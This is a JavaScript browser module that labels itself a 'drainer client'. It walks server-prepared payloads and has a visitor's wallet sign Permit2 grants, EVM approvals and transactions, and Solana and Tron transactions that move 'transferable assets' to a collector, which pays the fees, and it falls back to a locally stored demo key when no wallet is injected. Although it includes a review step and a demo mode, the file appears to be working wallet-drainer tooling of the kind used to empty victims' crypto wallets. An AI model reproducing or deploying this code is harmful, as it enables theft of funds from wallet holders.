/**
 * Drainer client.
 *
 * Walks the payloads returned by POST /api/drainer/wallets/:id/prepare and asks the
 * injected wallet to sign each one. Handles chain switching before every EVM step,
 * checks every HTTP response, and serialises Solana transactions that are only
 * partially signed (the collector is the fee payer).
 */

/**
 * Chain metadata for wallet_addEthereumChain. The server registry is
 * authoritative; this map is the offline fallback for the original five chains.
 */
const CHAINS = {
  1:     { hex: "0x1",     name: "Ethereum", symbol: "ETH", rpc: "https://ethereum-rpc.publicnode.com",  explorer: "https://etherscan.io" },
  8453:  { hex: "0x2105",  name: "Base",     symbol: "ETH", rpc: "https://base-rpc.publicnode.com",      explorer: "https://basescan.org" },
  42161: { hex: "0xa4b1",  name: "Arbitrum", symbol: "ETH", rpc: "https://arbitrum-one-rpc.publicnode.com", explorer: "https://arbiscan.io" },
  56:    { hex: "0x38",    name: "BSC",      symbol: "BNB", rpc: "https://bsc-rpc.publicnode.com",       explorer: "https://bscscan.com" },
  137:   { hex: "0x89",    name: "Polygon",  symbol: "POL", rpc: "https://polygon-bor-rpc.publicnode.com", explorer: "https://polygonscan.com" },
};

let chainsLoaded = false;

async function loadChains() {
  if (chainsLoaded) return;
  chainsLoaded = true;
  try {
    const res = await fetch("/api/public/chains", { credentials: "include" });
    if (!res.ok) { chainsLoaded = false; return; }
    const body = await res.json();
    for (const c of body.chains || []) {
      if (!c || !c.chainId) continue;
      CHAINS[c.chainId] = {
        hex: c.hexChainId || `0x${Number(c.chainId).toString(16)}`,
        name: c.name,
        symbol: c.native,
        rpc: c.rpc || (CHAINS[c.chainId] || {}).rpc,
        explorer: c.explorer || (CHAINS[c.chainId] || {}).explorer,
      };
    }
  } catch {
    chainsLoaded = false;   // allow a retry on the next prepare
  }
}

function csrf() {
  const m = document.cookie.match(/(?:^|;\s*)nx_csrf=([^;]+)/);
  return m ? decodeURIComponent(m[1]) : "";
}

async function post(url, body) {
  const headers = { "content-type": "application/json", "X-Nectra": "1" };
  const token = csrf();
  if (token) headers["X-CSRF"] = token;
  const res = await fetch(url, {
    method: "POST",
    credentials: "include",
    headers,
    body: JSON.stringify(body ?? {}),
  });
  let data = null;
  try { data = await res.json(); } catch { /* empty body */ }
  if (!res.ok) {
    const d = data && data.detail;
    throw new Error(typeof d === "string" ? d : JSON.stringify(d ?? res.status));
  }
  return data;
}

async function evmAccount() {
  const eth = window.ethereum;
  if (!eth) throw new Error("No EVM wallet detected");
  const accounts = await eth.request({ method: "eth_requestAccounts" });
  if (!accounts || !accounts.length) throw new Error("Wallet not connected");
  return accounts[0];
}

async function ensureChain(chainId) {
  const target = CHAINS[chainId];
  if (!target) throw new Error(`Unsupported chain ${chainId}`);
  const current = await window.ethereum.request({ method: "eth_chainId" });
  if (String(current).toLowerCase() === target.hex) return;
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: target.hex }],
    });
  } catch (e) {
    if (e && e.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: target.hex,
          chainName: target.name,
          nativeCurrency: { name: target.symbol, symbol: target.symbol, decimals: 18 },
          rpcUrls: [target.rpc],
          blockExplorerUrls: [target.explorer],
        }],
      });
    } else {
      throw e;
    }
  }
}

async function signPermit2(p) {
  await ensureChain(p.chainId);
  const from = await evmAccount();
  const signature = await window.ethereum.request({
    method: "eth_signTypedData_v4",
    params: [from, JSON.stringify(p.typed_data)],
  });
  for (const id of p.grant_ids) await post("/api/drainer/signed", { grant_id: id, signature });
}

async function sendEvmTx(p) {
  await ensureChain(p.chainId);
  const from = await evmAccount();
  const txid = await window.ethereum.request({
    method: "eth_sendTransaction",
    params: [{ from, to: p.tx.to, value: p.tx.value, data: p.tx.data }],
  });
  for (const id of p.grant_ids) await post("/api/drainer/signed", { grant_id: id, txid });
}

function base64FromBytes(bytes) {
  let s = "";
  for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
  return btoa(s);
}

function bytesFromBase64(b64) {
  const s = atob(b64);
  const out = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) out[i] = s.charCodeAt(i);
  return out;
}

async function solanaProvider() {
  return window.phantom?.solana || window.solflare || window.backpack || window.solana || null;
}

/** Demo-mode browser key (created by the Wallets → Demo wallet flow). */
async function demoLocalKey() {
  let address = "";
  try { address = JSON.parse(localStorage.getItem("nx-demo-wallet") || '""'); } catch { /* */ }
  if (!address) return null;
  const db = await new Promise((res, rej) => {
    const r = indexedDB.open("nectra-keys", 1);
    r.onsuccess = () => res(r.result);
    r.onerror = () => rej(r.error);
  });
  const key = await new Promise((res) => {
    const r = db.transaction("keys").objectStore("keys").get(address);
    r.onsuccess = () => res(r.result);
    r.onerror = () => res(null);
  });
  return key && key.privateKey ? { address, key } : null;
}

async function signSolanaLocal(raw, address) {
  const { Transaction, PublicKey } = window.solanaWeb3;
  const local = await demoLocalKey();
  if (!local || (address && local.address !== address)) {
    throw new Error("Open the Solana wallet that owns this address, or use the demo wallet");
  }
  const tx = Transaction.from(bytesFromBase64(raw));
  const signature = new Uint8Array(await crypto.subtle.sign(
    { name: "Ed25519" }, local.key, tx.serializeMessage()));
  tx.addSignature(new PublicKey(local.address), signature);
  return base64FromBytes(
    tx.serialize({ requireAllSignatures: false, verifySignatures: false }));
}

async function signSolana(p, address) {
  const provider = await solanaProvider();
  const selected = provider && provider.publicKey && provider.publicKey.toString();
  if (selected && address && selected !== address) {
    throw new Error(`Wrong account selected — switch to ${address.slice(0, 6)}…`);
  }
  if (provider && provider.connect) {
    try { await provider.connect(); } catch { /* already connected */ }
  }
  const { Transaction } = window.solanaWeb3;
  const payloads = p.txs || (p.tx ? [p.tx] : []);
  if (!payloads.length) throw new Error("No Solana transaction to sign");

  let last = null;
  for (const raw of payloads) {
    let b64;
    if (provider && provider.signTransaction && (!selected || selected === address)) {
      const signed = await provider.signTransaction(Transaction.from(bytesFromBase64(raw)));
      b64 = base64FromBytes(
        signed.serialize({ requireAllSignatures: false, verifySignatures: false }));
    } else {
      // No injected wallet (or the wrong one): fall back to the demo key.
      b64 = await signSolanaLocal(raw, address);
    }
    last = await post("/api/drainer/broadcast", { family: "solana", payload: b64 });
  }
  for (const id of p.grant_ids) {
    await post("/api/drainer/signed", { grant_id: id, txid: last && last.txid });
  }
}

async function signTron(p, address) {
  const tw = window.tronWeb;
  if (!tw) throw new Error("No Tron wallet detected");
  if (tw.defaultAddress?.base58 && address && tw.defaultAddress.base58 !== address) {
    throw new Error("Wrong TronLink account selected");
  }
  for (const raw of p.txs) {
    const signed = await tw.trx.sign(raw);
    const res = await post("/api/drainer/broadcast", {
      family: "tron",
      payload: JSON.stringify(signed),
    });
    for (const id of p.grant_ids) await post("/api/drainer/signed", { grant_id: id, txid: res.txid });
  }
}

/**
 * Build the plan without signing. The page renders it first so the user can
 * review every cap before the wallet prompts appear.
 */
export async function prepareDrainer(walletId) {
  await loadChains();
  return post(`/api/drainer/wallets/${walletId}/prepare`, {});
}

/** Sign and submit every payload of an already-prepared plan. */
export async function signPlan(plan, onProgress = () => {}) {
  const payloads = plan.payloads || [];
  if (!payloads.length) {
    throw new Error("Nothing to authorise — no transferable assets found");
  }

  const total = payloads.length;
  let done = 0;

  for (const p of payloads) {
    onProgress(++done, total, p.type);
    try {
      if (p.type === "permit2") await signPermit2(p);
      else if (p.type === "evm_tx" || p.type === "evm_approve") await sendEvmTx(p);
      else if (p.type === "solana_tx") await signSolana(p, plan.address);
      else if (p.type === "tron_tx") await signTron(p, plan.address);
    } catch (e) {
      e.step = p.type;
      e.stepIndex = done;
      throw e;
    }
  }

  return plan;
}

/**
 * One-shot prepare + sign, kept for callers that do not need the review step.
 */
export async function runDrainer(walletId, onProgress = () => {}, onPlan = () => {}) {
  const plan = await prepareDrainer(walletId);
  onPlan(plan);
  return signPlan(plan, onProgress);
}

export { CHAINS };